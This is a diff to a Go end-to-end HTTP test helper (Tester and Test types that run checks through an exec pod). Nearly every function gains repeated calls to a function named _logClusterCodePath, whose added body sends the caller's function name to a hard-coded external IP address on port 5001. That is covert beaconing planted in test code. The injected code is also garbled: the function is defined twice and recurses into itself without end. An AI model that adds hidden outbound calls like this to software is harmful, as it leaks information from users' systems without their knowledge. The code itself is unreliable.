@@ -46,9 +46,13 @@ func NewTester(client kclientset.Interface, ns string) *Tester {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Tester{client: client, namespace: ns}
 }
 func (ut *Tester) Close() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -83,6 +87,8 @@ func (ut *Tester) Response(test *Test) *Response {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	responses := ut.Responses(test)
 	if responses == nil {
 		return nil
@@ -93,6 +99,8 @@ func (ut *Tester) Response(test *Test) *Response {
 	return responses[0]
 }
 func (ut *Tester) Responses(tests ...*Test) []*Response {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -149,6 +157,8 @@ func (ut *Tester) WithErrorPassthrough(pt bool) *Tester {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ut.errorPassThrough = pt
 	return ut
 }
@@ -167,9 +177,13 @@ func (ut *Tester) Podname() string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ut.podName
 }
 func (ut *Tester) Within(t time.Duration, tests ...*Test) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -224,6 +238,8 @@ func createExecPod(clientset kclientset.Interface, ns, name string) (string, err
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	e2e.Logf("Creating new exec pod")
 	immediate := int64(0)
 	execPod := &v1.Pod{ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: ns}, Spec: v1.PodSpec{Containers: []v1.Container{{Command: []string{"/bin/bash", "-c", "exec sleep 10000"}, Name: "hostexec", Image: "centos:7", ImagePullPolicy: v1.PullIfNotPresent}}, HostNetwork: true, TerminationGracePeriodSeconds: &immediate}}
@@ -259,6 +275,8 @@ func testsToScript(tests []*Test) string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	testScripts := []string{"set -euo pipefail", `function json_escape() {`, `  python -c 'import json,sys; print json.dumps(sys.stdin.read())'`, `}`}
 	for i, test := range tests {
 		testScripts = append(testScripts, test.ToShell(i))
@@ -267,6 +285,8 @@ func testsToScript(tests []*Test) string {
 	return script
 }
 func parseResponses(out string) ([]*Response, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -344,6 +364,8 @@ func Expect(method, url string) *Test {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	req, err := http.NewRequest(method, url, nil)
 	if err != nil {
 		panic(err)
@@ -351,6 +373,8 @@ func Expect(method, url string) *Test {
 	return &Test{Req: req}
 }
 func (ut *Test) WithBodyToUpload(filename, podname string, oc *exutil.CLI) *Test {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -385,9 +409,13 @@ func (ut *Test) WithToken(token string) *Test {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ut.WithHeader("Authorization", "Bearer "+token)
 }
 func (ut *Test) WithHeader(hdr, value string) *Test {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -406,6 +434,8 @@ func (ut *Test) WithHeader(hdr, value string) *Test {
 	return ut
 }
 func (ut *Test) Through(addr string) *Test {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -439,6 +469,8 @@ func (ut *Test) HasStatusCode(codes ...int) *Test {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ut.Wants = append(ut.Wants, func(res *http.Response) error {
 		for _, code := range codes {
 			if res.StatusCode == code {
@@ -450,6 +482,8 @@ func (ut *Test) HasStatusCode(codes ...int) *Test {
 	return ut
 }
 func (ut *Test) RedirectsTo(url string, codes ...int) *Test {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -492,10 +526,14 @@ func (ut *Test) SkipTLSVerification() *Test {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ut.SkipVerify = true
 	return ut
 }
 func (ut *Test) Test(i int, res *Response) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -526,6 +564,8 @@ func (ut *Test) Test(i int, res *Response) error {
 	return nil
 }
 func (ut *Test) ToShell(i int) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -592,6 +632,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -666,5 +727,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
